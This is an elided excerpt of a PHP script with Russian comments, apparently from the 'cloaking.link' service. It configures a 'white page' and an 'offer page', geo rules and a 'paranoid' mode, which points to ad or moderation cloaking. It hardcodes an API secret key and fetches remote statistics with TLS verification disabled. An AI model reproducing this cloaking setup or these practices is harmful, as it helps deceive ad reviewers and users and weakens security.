...
$CLOAKING['API_SECRET_KEY'] = 'v163fe81c6657c430196acac5ff2c1db96';// ключ доступа к API.
/*********************************************/
// Не вносите изменения в дальнейший код (по крайней мере если вы не PHP програмист)
// DO NOT EDIT ANYTHING BELOW !!!
$CLOAKING['VERSION']=20191022;
...
if(!empty($_REQUEST['cloaking'])) {
    ...
    if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
        ...
        if (empty($CLOAKING['USE_CURL'])) $statistic = file_get_contents('https://cloaking.link/stat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&version='.$CLOAKING['VERSION'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']), 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 25), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
        else $statistic = cloakedCurl('https://cloaking.link/stat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&version='.$CLOAKING['VERSION'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']));
        echo $statistic;
        ...
        echo rand(1,100000).'-'.microtime().'-'.rand(1,100000);
    }
    die();
}
...
// если у вас в команде нормальный админ и програмист, это можно удалить
    ...
    srand(crc32($CLOAKING['API_SECRET_KEY'].$host));
}
...
if(empty($CLOAKING['HTACCESS_FIX']) && preg_match('#\.(jpg|gif|jpeg|css|gif|svg|ttf|woff|webm)$#i',$_SERVER["REQUEST_URI"])){
...
else $CLOAKINGdata = getallheaders();
